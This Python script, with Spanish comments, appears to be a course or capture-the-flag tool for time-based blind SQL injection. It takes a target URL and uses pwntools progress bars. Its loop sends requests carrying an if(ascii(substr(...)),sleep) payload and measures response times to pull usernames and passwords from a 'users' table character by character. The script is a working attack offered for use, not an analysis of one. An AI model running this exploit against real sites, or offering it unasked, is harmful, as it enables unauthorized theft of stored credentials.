 #!/usr/bin/python3
 
 import requests 
 import signal
 import sys
 import time
 import string
 from pwn import *
 
 
     #Necesita 2 valores, si no da error syntax o error de declaracion. Al presionar Ctrl+C -> Salir.
 def def_handler(sig, frame):
     print("\n\n[!] Salinedo...\n")
     #Salir con un estado no exitoso.
     sys.exit(1)
 
 
 # Crtl+C
 signal.signal(signal.SIGINT, def_handler)
 
  
 # Variables Globales
 main_url = "Tu --url"
 # Todas las posibles combinatorias de caracteres #import string
 characters = string.printable
 
     #Definicion de makeSQLI()
 def makeSQLI():
 
     #pwn tools (barras de progreso)
     p1 = log.progress("Fuerza Bruta")
     p1.status("Iniciando proceso de fuerza bruta")
     
     time.sleep(2)
 
     p2 = log.progress("Datos extraidos")
 
     extracted_info = ""
     #Cambiar cu user o id por uno conocido #1#
     #Bucle principal que fila la posicion:
     for position in range(1, 150):
         for character in range(33, 126):                                                     
             sqli_url = main_url + "?id=#1# and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.50),1)" % (position, character)      
      
             
             p1.status(sqli_url)
             
             #Coge el timepo inicial.
             time_start  = time.time()
 
             # Con la libreria requests, envias una peticion por get a sqli_url
             r = requests.get(sqli_url)
             #coge el tiempo actual de nuevo.
             time_end = time.time()
 
             # Si el tiempo final - el tiempo in inicial es mayor que 0.5, muestrale la letra primera letra de el nombre
             if time_end - time_start > 0.50:
               extracted_info += chr(character)
               p2.status(extracted_info)
                 #Saltar a la siguente iteracion y que no siga probrando para la posicion acual mas caracteres
               break
    
 
    #Flujo inicial del programa:
 
 if __name__ == '__main__':
 
    
     makeSQLI()
 
 
 
